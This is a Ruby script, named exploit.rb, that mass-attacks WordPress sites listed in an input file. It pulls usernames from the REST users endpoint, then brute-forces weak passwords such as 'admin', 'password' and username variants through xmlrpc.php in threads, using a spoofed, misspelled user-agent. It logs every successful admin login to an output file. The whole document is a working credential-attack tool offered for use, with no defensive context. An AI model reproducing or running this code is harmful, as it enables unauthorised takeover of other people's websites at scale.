require 'net/http'
require 'uri'
require 'optparse'
require 'eventmachine'
require 'json'

class XMLRPC_WP
  def initialize
    @headers = {
      'Connection' => 'keep-alive',
      'User-Agent' => 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
      'referer' => 'www.google.com'
    }

    @params = {
      input_file: nil,
      output_file: 'output.txt'
    }

    @threads = []
  end

  def exploit(url_exploit)
    begin
      url = URI.parse(url_exploit)

      http = Net::HTTP.new(url.host, url.port)
      http.use_ssl = (url.scheme == "https")

      request = Net::HTTP::Get.new("#{url.scheme}://#{url.host}/?rest_route=/wp/v2/users", @headers)
      response_exploit = http.request(request)

      if response_exploit.body.include?('gravatar.com')
        usernames = JSON.parse(response_exploit.body).map { |user| user['name'] }

        if usernames.any?
          usernames.each do |username|

            pass = [
              username + username, username, username + '123', username + '1234', "admin", "root", "password", "pass"
            ]

            pass.each do |password|
              xmlrpc_payload = <<-XMLRPC
                <methodCall>
                  <methodName>wp.getUsersBlogs</methodName>
                  <params>
                    <param><value>#{username}</value></param>
                    <param><value>#{password}</value></param>
                  </params>
                </methodCall>
              XMLRPC

              begin
                request = Net::HTTP::Post.new("#{url.scheme}://#{url.host}/xmlrpc.php", @headers)
                request.body = xmlrpc_payload

                post_load = http.request(request)

                if post_load.body.include?('blogName')
                  puts("#{url.scheme}://#{url.host}/?rest_route=/wp/v2/users --> Users Found".green)
                  log_checker(url_exploit, username, password)
                else
                  puts("#{url.scheme}://#{url.host}/?rest_route=/wp/v2/users --> Not Vuln: (blogName Not Found)".red)
                  return
                end
              rescue StandardError => err
                puts("#{url.scheme}://#{url.host}/?rest_route=/wp/v2/users --> Not Vuln: #{err}".red)
              rescue Net::OpenTimeout, Net::ReadTimeout => err
                puts("#{url.scheme}://#{url.host}/?rest_route=/wp/v2/users --> Not Vuln: #{err}".red)
              end
            end
          end
        else
          puts("#{url.scheme}://#{url.host}/?rest_route=/wp/v2/users --> Not Vuln (Username Not Found)".red)
        end
      else
        puts("#{url.scheme}://#{url.host}/?rest_route=/wp/v2/users --> Not Vuln (Gravatar Not Found)".red)
        return
      end
    rescue StandardError => err
      puts("#{url.scheme}://#{url.host}/?rest_route=/wp/v2/users --> Not Vuln: #{err}".red)
    rescue Net::OpenTimeout, Net::ReadTimeout => err
      puts("#{url.scheme}://#{url.host}/?rest_route=/wp/v2/users --> Not Vuln: #{err}".red)
    end
  end

  def log_checker(url_check, user, password)
    url = URI.parse(url_check)
    url.path = "/xmlrpc.php"

    http = Net::HTTP.new(url.host, url.port)
    http.use_ssl = (url.scheme == "https")

    request = Net::HTTP::Post.new(url.path)

    request.set_form_data(
      'log' => user,
      'pwd' => password,
      'wp-submit' => 'Log In',
      )

    request['Cookie'] = 'testcookie=1'
    response = http.request(request)

    if response.code == '302'
      if response['location'].include?('admin')
        File.open(@params[:output_file], "a+") do |file|
          file.puts("#{url.scheme}://#{url.host}/wp-login.php##{user}@#{password}")
        end
      end
    else
      puts("#{url.scheme}://#{url.host}/xmlrpc.php --> Not Vuln".red)
    end
  end

  def print_help
    help_text = <<-'HELP_TEXT'
USAGE: ruby exploit.rb [options]

OPTIONS:
  -i, --input_file INPUT_FILE: Define the path to the URL file.
  -o, --output_file OUTPUT_FILE: Define the name of the output log file.
    HELP_TEXT

    puts(help_text.magenta)
  end

  def parse_lines(lines)
    lines.each do |line|
      exploit(line.strip)
    end
  end

  def parser_options
    begin
      OptionParser.new do |parser|
        parser.on("-i", "--input_file INPUT_FILE") do |input_file|
          if File.exist?(input_file)
            @params[:input_file] = input_file
          else
            STDERR.puts("Not Found: #{input_file}".red)
            exit(1)
          end
        end

        parser.on("-o", "--output_file OUTPUT_FILE") do |output_file|
          @params[:output_file] = output_file
        end
      end.parse!
    rescue Exception => err_parser
      STDERR.puts("Error: #{err_parser}")
    end
  end

  def main
    begin
      unless @params[:input_file].nil?
        lines = File.readlines(@params[:input_file])

        lines.each_slice(20) do |line_group|
          @threads << Thread.new{parse_lines(line_group)}
        end

        @threads.each(&:join)

        puts("Exploit Completed".magenta)
        EM.stop
      else
        print_help
        EM.stop
      end
    rescue StandardError
      return
      EM.stop
    end
  end
end

class String
  def red
    "\e[31m#{self}\e[0m"
  end

  def green
    "\e[32m#{self}\e[0m"
  end

  def magenta
    "\e[35m#{self}\e[0m"
  end
end

EM.run do
  xmlrpc = XMLRPC_WP.new
  xmlrpc.parser_options
  xmlrpc.main
end
